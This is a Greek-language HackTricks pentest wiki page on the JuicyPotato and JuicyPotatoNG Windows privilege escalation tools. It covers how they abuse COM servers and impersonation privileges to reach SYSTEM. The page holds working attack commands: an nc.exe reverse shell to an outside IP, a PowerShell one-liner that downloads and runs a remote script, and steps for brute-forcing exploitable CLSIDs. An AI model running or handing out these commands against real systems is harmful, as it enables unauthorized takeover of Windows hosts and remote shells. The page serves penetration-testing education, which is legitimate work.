# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > Το JuicyPotato είναι legacy. Γενικά λειτουργεί σε εκδόσεις Windows έως και Windows 10 1803 / Windows Server 2016. Οι αλλαγές της Microsoft που κυκλοφόρησαν από τα Windows 10 1809 / Server 2019 και μετά έσπασαν την αρχική τεχνική. Για αυτά τα builds και νεότερα, εξετάστε σύγχρονες εναλλακτικές όπως τα PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato και άλλα. Δείτε τη σελίδα παρακάτω για ενημερωμένες επιλογές και χρήση.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusing the golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Μια εμπλουτισμένη έκδοση του_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, με λίγη επιπλέον ισχύ, δηλαδή **ένα ακόμη εργαλείο Local Privilege Escalation, από Windows Service Accounts σε NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### Μπορείτε να κατεβάσετε το juicypotato από [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Σύντομες σημειώσεις συμβατότητας

- Λειτουργεί αξιόπιστα έως τα Windows 10 1803 και τα Windows Server 2016 όταν το τρέχον context διαθέτει SeImpersonatePrivilege ή SeAssignPrimaryTokenPrivilege.
- Δεν λειτουργεί λόγω του hardening της Microsoft στα Windows 10 1809 / Windows Server 2019 και νεότερα. Για αυτά τα builds, προτιμήστε τις εναλλακτικές που συνδέονται παραπάνω.

### Περίληψη <a href="#summary" id="summary"></a>

[**Από το Readme του juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

Τα [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) και οι [παραλλαγές](https://github.com/decoder-it/lonelypotato) του αξιοποιούν την αλυσίδα privilege escalation που βασίζεται στην υπηρεσία [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126), η οποία έχει τον MiTM listener στη διεύθυνση `127.0.0.1:6666`, όταν διαθέτετε privileges `SeImpersonate` ή `SeAssignPrimaryToken`. Κατά την εξέταση ενός Windows build, εντοπίσαμε μια εγκατάσταση όπου το `BITS` ήταν σκόπιμα απενεργοποιημένο και η port `6666` ήταν κατειλημμένη.

Αποφασίσαμε να weaponize το [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Πείτε γεια στο Juicy Potato**.

> Για τη θεωρία, δείτε το [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) και ακολουθήστε την αλυσίδα των links και των references.<sup>[[4]](#references)</sup>

Ανακαλύψαμε ότι, εκτός από το `BITS`, υπάρχουν αρκετοί COM servers που μπορούμε να καταχραστούμε. Πρέπει απλώς:

1. να μπορούν να γίνουν instantiated από τον τρέχοντα χρήστη, συνήθως έναν “service user” που διαθέτει impersonation privileges
2. να υλοποιούν το interface `IMarshal`
3. να εκτελούνται ως elevated user (SYSTEM, Administrator, …)

Μετά από δοκιμές, αποκτήσαμε και ελέγξαμε μια εκτενή λίστα [ενδιαφερόντων CLSID’s](http://ohpe.it/juicy-potato/CLSID/) σε διάφορες εκδόσεις Windows.

### Juicy λεπτομέρειες <a href="#juicy-details" id="juicy-details"></a>

Το JuicyPotato σάς επιτρέπει να:<sup>[[1]](#references)</sup>

- **Target CLSID** _επιλέξετε οποιοδήποτε CLSID θέλετε._ [_Εδώ_](http://ohpe.it/juicy-potato/CLSID/) _μπορείτε να βρείτε τη λίστα οργανωμένη ανά OS._
- **COM Listening port** _ορίσετε τη COM listening port που προτιμάτε (αντί για τη marshalled hardcoded 6666)_
- **COM Listening IP address** _κάνετε bind τον server σε οποιαδήποτε IP_
- **Process creation mode** _ανάλογα με τα privileges του impersonated user, μπορείτε να επιλέξετε:_
- `CreateProcessWithToken` (χρειάζεται `SeImpersonate`)
- `CreateProcessAsUser` (χρειάζεται `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _εκκινήσετε ένα executable ή script, εάν το exploitation είναι επιτυχές_
- **Process Argument** _προσαρμόσετε τα arguments του launched process_
- **RPC Server address** _για μια stealthy προσέγγιση, μπορείτε να κάνετε authenticate σε έναν external RPC server_
- **RPC Server port** _χρήσιμο εάν θέλετε να κάνετε authenticate σε έναν external server και το firewall μπλοκάρει την port `135`…_
- **TEST mode** _κυρίως για σκοπούς testing, δηλαδή για testing CLSIDs. Δημιουργεί το DCOM και εμφανίζει τον user του token. Δείτε_ [_εδώ για testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Τελικές σκέψεις <a href="#final-thoughts" id="final-thoughts"></a>

[**Από το Readme του juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Εάν ο χρήστης έχει τα privileges `SeImpersonate` ή `SeAssignPrimaryToken`, τότε είστε **SYSTEM**.

Είναι σχεδόν αδύνατο να αποτραπεί η κατάχρηση όλων αυτών των COM Servers. Θα μπορούσατε να εξετάσετε την τροποποίηση των permissions αυτών των objects μέσω του `DCOMCNFG`, αλλά καλή τύχη· αυτό θα είναι δύσκολο.

Η πραγματική λύση είναι η προστασία των sensitive accounts και applications που εκτελούνται υπό τους λογαριασμούς `* SERVICE`. Η απενεργοποίηση του `DCOM` θα εμπόδιζε σίγουρα αυτό το exploit, αλλά θα μπορούσε να έχει σοβαρές επιπτώσεις στο υποκείμενο OS.

Από: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

Το JuicyPotatoNG επαναφέρει ένα local privilege escalation τύπου JuicyPotato σε σύγχρονα Windows, συνδυάζοντας:<sup>[[2]](#references)</sup>
- DCOM OXID resolution σε έναν local RPC server σε επιλεγμένο port, αποφεύγοντας τον παλιό hardcoded listener 127.0.0.1:6666.
- Ένα SSPI hook για την capture και impersonation του εισερχόμενου SYSTEM authentication, χωρίς να απαιτείται το RpcImpersonateClient, το οποίο επίσης επιτρέπει το CreateProcessAsUser όταν υπάρχει μόνο το SeAssignPrimaryTokenPrivilege.
- Tricks για την ικανοποίηση των περιορισμών ενεργοποίησης του DCOM (π.χ. την πρώην απαίτηση του INTERACTIVE group κατά τη στόχευση των κλάσεων PrintNotify / ActiveX Installer Service).

Σημαντικές σημειώσεις (η συμπεριφορά εξελίσσεται μεταξύ διαφορετικών builds):<sup>[[2]](#references)</sup>
- Σεπτέμβριος 2022: Η αρχική technique λειτουργούσε σε υποστηριζόμενα Windows 10/11 και Server targets χρησιμοποιώντας το “INTERACTIVE trick”.
- Ενημέρωση από τους authors τον Ιανουάριο του 2023: Η Microsoft αργότερα απέκλεισε το INTERACTIVE trick. Ένα διαφορετικό CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) επαναφέρει το exploitation, αλλά μόνο σε Windows 11 / Server 2022, σύμφωνα με τη δημοσίευσή τους.

Βασική χρήση (περισσότερα flags στη βοήθεια):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Αν στοχεύετε Windows 10 1809 / Server 2019, όπου το classic JuicyPotato έχει γίνει patched, προτιμήστε τις alternatives που αναφέρονται στην κορυφή (RoguePotato, PrintSpoofer, EfsPotato/GodPotato κ.λπ.). Το NG μπορεί να είναι situational, ανάλογα με το build και την κατάσταση της υπηρεσίας.

## Παραδείγματα

Σημείωση: Επισκεφθείτε [αυτή τη σελίδα](https://ohpe.it/juicy-potato/CLSID/) για μια λίστα με CLSIDs που μπορείτε να δοκιμάσετε.

### Λάβετε ένα nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Εκκίνηση ενός νέου CMD (αν έχετε πρόσβαση μέσω RDP)

![Powershell rev - Εκκίνηση ενός νέου CMD (αν έχετε πρόσβαση μέσω RDP): Εκκίνηση ενός νέου CMD (αν έχετε πρόσβαση μέσω RDP)](<../../images/image (300).png>)

## Προβλήματα CLSID

Συχνά, το προεπιλεγμένο CLSID που χρησιμοποιεί το JuicyPotato **δεν λειτουργεί** και το exploit αποτυγχάνει. Συνήθως, απαιτούνται πολλές προσπάθειες για να βρεθεί ένα **λειτουργικό CLSID**. Για να λάβετε μια λίστα με CLSIDs προς δοκιμή για ένα συγκεκριμένο λειτουργικό σύστημα, επισκεφθείτε αυτήν τη σελίδα:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Έλεγχος CLSIDs**

Αρχικά, θα χρειαστείτε ορισμένα executables εκτός από το juicypotato.exe.

Κατεβάστε το [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) και φορτώστε το στη συνεδρία PS, και κατεβάστε και εκτελέστε το [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Αυτό το script θα δημιουργήσει μια λίστα πιθανών CLSIDs προς δοκιμή.

Στη συνέχεια, κατεβάστε το [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(αλλάξτε το path προς τη λίστα CLSID και προς το εκτελέσιμο του juicypotato) και εκτελέστε το. Θα ξεκινήσει να δοκιμάζει κάθε CLSID και **όταν αλλάξει ο αριθμός της port, αυτό σημαίνει ότι το CLSID λειτούργησε**.

**Ελέγξτε** τα λειτουργικά CLSIDs **χρησιμοποιώντας την παράμετρο -c**

## Αναφορές

- [1] [Juicy Potato README (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Δίνοντας στο JuicyPotato μια δεύτερη ευκαιρία: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Σελίδα project του Juicy Potato (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Privilege Escalation από Service Accounts σε SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

{{#include ../../banners/hacktricks-training.md}}
